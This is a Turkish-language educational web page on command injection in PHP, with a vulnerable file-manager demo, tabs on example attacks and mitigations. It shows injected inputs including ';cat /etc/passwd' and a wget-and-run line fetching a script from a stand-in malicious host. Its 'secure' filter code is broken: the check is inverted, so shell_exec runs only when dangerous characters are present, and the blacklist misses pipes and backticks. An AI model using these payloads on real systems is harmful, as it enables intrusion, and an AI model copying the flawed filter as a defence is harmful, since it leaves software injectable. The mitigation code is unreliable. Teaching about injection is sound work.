<!DOCTYPE html>
<html>
<head>
    <title>Command Injection</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.0/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>



    <link href="css/header.css" rel="stylesheet">
    <link href="css/footer.css" rel="stylesheet">
    <link href="css/vulner.css" rel="stylesheet">
</head>

<body>
    <?php include 'lyt/header.php';?>
    <div class="container">
        <div class="row">
            <div class="vulner">
                <div class="col-lg-3 col-md-3 col-sm-4">


                    <ul class="nav nav-pills nav-stacked">
                        <li class="active"><a data-toggle="pill" href="#home">Command Injection</a></li>
                        <li><a data-toggle="pill" href="#menu1">Örnek Saldırı</a></li>
                        <li><a data-toggle="pill" href="#menu2">Alınabilecek Önlemler</a></li>
                        <li><a data-toggle="modal" href="#popUp">Yardım</a></li>
                    </ul>




                    <!-- Modal -->
                    <div class="modal fade" id="popUp" role="dialog">
                        <div class="modal-dialog">

                            <!-- Modal content-->
                            <div class="modal-content">
                                <div class="modal-header">
                                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                                    <h4 class="modal-title">Yardım</h4>
                                </div>
                                <div class="modal-body">
                                    <p>
                                        Aşağıda Command Injection açığı barındıran demo sayfası için bağlantı verilmiştir. BU bağlantıda kullanıcıdan dosya ismi girilmesi istenmektedir. Bu dosya ismi adres çubuğundan GET parametresi olarak alınmaktadır. Normal koşullarda <pre>ci.php?filename=dosya1.txt&amp;gorev=goruntule</pre> şeklinde dosya ismi beklenmektedir. gorev değişkeninin içeriğine göre dosyalar görüntülünebilir, eklenebilir ya da silinebilir.
                                    </p>
                                    <p>
                                        Fakat filename değişkeni doğrudan sisteme gönderilmektedir, burada da Command Injection açığı oluşur.
                                    </p>
                                        <br><p class="text-center"><a href="vulners/index.php?a=ci">Örnek Demo</a></p>
                                    </div>
                                    <div class="modal-footer">
                                        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                                    </div>
                                </div>

                            </div>
                        </div>


                    </div>
                    <div class="col-lg-8 col-md-8 col-sm-8">
                        <div class="tab-content">
                            <div id="home" class="tab-pane fade in active">
                                <h3>Command Injection</h3>
                                <p>Komut enjeksiyonu host işletim sistemlerinde keyfi komutların çalıştırılmasını sağlayan bir çeşit saldırı türüdür. Komut enjeksiyonu, applikasyonlar kullanıcıların çeşitli şekillerde girdiği (formlar, çerezler, HTTP header'ları vs.) tehlikeli girileri doğrudan işletim sistemine gönderdiğinde ortaya çıkar. Bu saldırıda saldırganın çalıştırdığı komutlar genelde aplikasyonun izinleri dahilinde çalışır. Komut enjeksiyonu yetersiz giriş kontrolü yapıldığı durumlarda oluşur. </p>

                            </div>
                            <div id="menu1" class="tab-pane fade">
                                <h3>Örnek Saldırı</h3>
                                <p>
                                    Bu uygulamada kullanıcıdan dosya sistemi düzenleme programı yapılması istenmiştir. Eğer her şey iyi giderse kullanıcı <code>ci/</code> klasörünün içeriğini istediği gibi değiştirebilmektedir.
                                </p>
                                <p>Kullanıcı dosya ismini yazıp işlem seçtiğinde seçtiğinde adres çubuğundan <pre>/ci.php?filename=dosya.txt&amp;gorev=goruntule</pre> şeklinde istek yapılmaktadır. Burada kullanıcının girdiği <code>filename</code> değişkeni doğrudan çeşitli işletim sistemi programlarına gönderilmektedir.
                                </p>
                                <p>
                                    Burada <code>filename</code> değişkeni kullanıcıdan alındığı ve doğrudan sisteme gönderildiği için, kullanıcı kendi istediği komutları başına <code>;</code> karakteri koyarak çağırabilir. Örnek olarak kullanıcı <pre>;ls</pre> yazarak dosyaları görüntüleyebilir, ya da <pre>;cat /etc/passwd</pre> sistemdeki kullanıcı görüntülüyebilir. Daha da kötüsü <pre>;wget http:\\zararli.com\zararli_yazilim.sh &amp;&amp; .\zararli_yazilim.sh</pre> şeklinde internetten sisteme zararlı yazılım indirip bunları çalıştırabilir.
                                </p>
                            </div>
                            <div id="menu2" class="tab-pane fade">
                                <h3>Alınabilecek Önlemler</h3>
                                <p>
                                    Alınabilecek önlemlerin en başında kullanıcının girişlerini sisteme göndermek yerine bunu sistem programları kullanmadan gerçekleştirmenin yolu aranmaktadır. Kullanıcının girdiği metinler örneğin, bizim örneğimizdeki gibi sistemde dosya açmak için kullanılıyorsa, bu girilerin cat programına gönderilmesi risk arz eden bir işlemdir, bunun yerine kullandığımız programlama dillerindeki yardımcı fonksiyonları tercih etmeliyiz. PHP dilinde dosya açma, düzenleme, silmeyi sağlayan çeşitli fonksiyonlar mevcuttur.
                                </p>
                                <p>
                                    Eğer mutlaka kullanıcının girişleri sisteme gönderiliyorsa girilen karakterleri filtrelemek etkili bir yöntem olabilir. Kullanıcının girebileceği ", $, &amp; ve ; gibi karakterleri filtrelememiz gerekir. Çünkü " bash scriptte sizin açtığınız bir tırnağı kapayabilir ve ya ; komutu sonlandırabilir, bu da kullanının yeni komut girebilmelerini sağlar. &amp;&amp; karakter dizisi ile de bir önceki komut bitirilebilir. Bu üç karakteri engellediğimiz halde $ karakteri engellemezsek kullanıcı <code>grep $(cat /etc/passwd) dosya.txt</code> gibi bir yöntemle tekrar sistemde komut çalıştırabilir.
                                </p>
                                <pre>
$input = $_GET["filename"];
if(strpos($input, "\"") !== false
|| strpos($input, ";") !== false
|| strpos($input, "$") !== false
|| strpos($input, "&amp;") !== false ){
    shell_exec("some_program " . $input);
}
                                </pre>
                                <p>
                                    Yukarıdaki örnekteki gibi bu karakterler var mı diye input'u kontrol edebiliriz, ya da <a href="https://secure.php.net/manual/tr/function.fopen.php">fopen()</a>, <a href="https://secure.php.net/manual/tr/function.fclose.php">fclose()</a> vs.. gibi PHP dosya rutinlerini kullanabiliriz.
                            </div>
                            <div id="yardim" class="tab-pane fade">
                            </div>
                        </div>

                    </div>
                </div>
            </div>
        </div>


        <?php include 'lyt/footer.php';?>


    </body>
    </html>
